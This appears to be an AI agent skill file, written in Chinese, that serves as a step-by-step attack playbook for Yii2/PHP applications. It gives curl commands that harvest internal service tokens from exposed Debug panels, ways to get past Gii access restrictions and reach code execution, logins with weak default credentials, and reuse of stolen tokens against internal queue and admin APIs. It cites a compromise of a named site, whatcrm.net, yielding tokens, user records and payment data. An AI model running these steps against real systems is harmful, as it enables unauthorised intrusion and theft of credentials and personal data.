---
name: yii2-security-testing
description: Use when 目标为 Yii2/PHP 应用，测试 Debug/Gii 模块未授权与内部 token 提取。
---

# Yii2 Security Testing — Yii2 框架渗透测试

## When to Use

- 目标指纹为 Yii2（PHP）：响应头出现 `X-Debug-Tag`、页面含 `yii-debug-toolbar`、错误信息含 `yii\web\BadRequestHttpException`、`ide://open?url=file:///var/www/...` 链接
- URL 结构：`/debug/default/index`、`/debug/default/view`、`/gii`、`/assets/<hash>/yii.js`、路由带 `/lk/` 等管理前缀
- 需要识别 Yii2 应用的 Debug/Gii/管理面板/内部 API 攻击面

## 攻击面优先级（从高到低）

### 1. Yii2 Debug 模块未授权（金矿，零认证）
Yii2 dev 环境常把 `yii-debug` 模块开在公网且未加 IP 限制。

```bash
# 探测
curl -s -o /dev/null -w "%{http_code}" "$TARGET/debug/default/index"
# 响应头是否泄露 X-Debug-Tag
curl -s -I "$TARGET/" | grep -i debug-tag
```

一旦 `/debug/default/index` 返回 200，即可拿到**全部请求历史**的调试数据：

| panel | 泄露内容 | 价值 |
|---|---|---|
| `panel=config` | PHP 版本、App 版本、YII_ENVIRONMENT、组件列表(gii/queue/redis)、DB 配置 | 指纹 + 版本关联 CVE |
| `panel=log` | `ide://open?url=file:///var/www/...` 绝对路径、用户代理 | 源码绝对路径 → 后续 LFI/写文件目标 |
| `panel=request` | **其他请求的 headers**（内部服务 token！）、body | 最高价值：内部 API token 直接暴露 |
| `panel=db` | 该请求执行的 SQL | 数据库结构 |
| `panel=user` | 请求对应的用户身份（是否 guest） | 找已登录管理员请求 |

```bash
# 核心利用：翻历史 tag 的 request panel，搜内部 token
curl -s "$TARGET/debug/default/view?tag=<TAG>&panel=request" | grep -oE 'x-[a-z-]+-token[^<]{0,60}'
# 或直接抓 index 拿到全部 tag 列表
curl -s "$TARGET/debug/default/index" | grep -oE 'view\?tag=[a-f0-9]{13}' | sort -u
```

**关键技巧**：Yii2 debug index 只显示最近 tag，历史 tag 翻页；每个 tag 的 request panel 才带 headers。同一部署下多个内部服务（queue worker）的请求会被记录，token 常共享同一值但头名不同（如 `x-max-token` / `x-telegram-token` / `x-whatsapp-token`）。

### 2. Gii 代码生成器（RCE 面）
`/gii` 返回 403 不代表不存在——只是 IP/来源限制。尝试 X-Forwarded-For 绕过、内网 IP 段、Host 头变体。若可访问，Gii 可生成任意 Model/Controller = 写入文件 = RCE。

### 3. 内部 Queue / 管理端点
Yii2 常部署 `yii2-queue`，dev 环境有 `/max/queue`、`/telegram/queue`、`/whatsapp/queue` 等自定义队列端点。用 debug 面板泄露的 token 直接调用：
```bash
# 无 token -> 401；有 token -> 200 "true"
curl -s -X POST "$TARGET/max/queue/index" -H "x-max-token: <token>"
```

### 4. Console / 管理面板 SPA + API
Yii2 后端常见配套 React/Vue 管理面板（如 `/lk/*` API 前缀）。攻击链：
1. 拉管理面板 JS bundle，搜 `X-` 开头 header 名 + 反引号模板 URL（`${base}/api/v4/...`、`/lk/...`）还原 API 结构
2. JS 里常**硬编码初始 token**（如 `X-Lk-Token`），用于 /authorization 入口
3. dev 环境弱口令：admin/admin123 直登 → localStorage.client 里有 access_token + role + access_level
4. Bearer token 访问 `/lk/users`、`/lk/tokens`、`/lk/billings`、`/lk/instances` → 全量数据

### 5. CouchDB / 附属数据库
`/_utils/` Fauxton 界面可访问（302）≠ 未授权，`_all_dbs` 仍 401 则需凭据；与 Yii2 应用同 IP 时可能同源凭据。

## 复用战术清单

1. **Debug 未授权 = 最高优先**：出现 `X-Debug-Tag` / `/debug/default/index` 200，先翻完所有 panel 再谈别的；request panel 里别的请求 headers 常带内部服务 token。
2. **dev 环境先打**：有 dev.* 子域时优先 dev 面板弱口令；dev 通常没上生产防护。
3. **前端 JS 当 API 地图**：React bundle 搜 `X-` header 名 + 反引号模板还原后端 API 结构。
4. **crt.sh 子域枚举**：`curl "https://crt.sh/?q=%25.domain&output=json"` 一次拿全部历史子域；dev/console/api/appNNN 命名直接暴露内部系统。
5. **SPA fallback 假 200 坑**：纯静态 SPA 对 `/api/*` 全部返回 200 首页 HTML，别被假 200 骗；真实 API 在独立后端域/前缀。

## 详细案例

见 `references/whatcrm-yii2-console-chain.md`（whatcrm.net CRM 实战：dev Console admin/admin123 → 42 个内部 token + 100 用户 + 支付记录）。
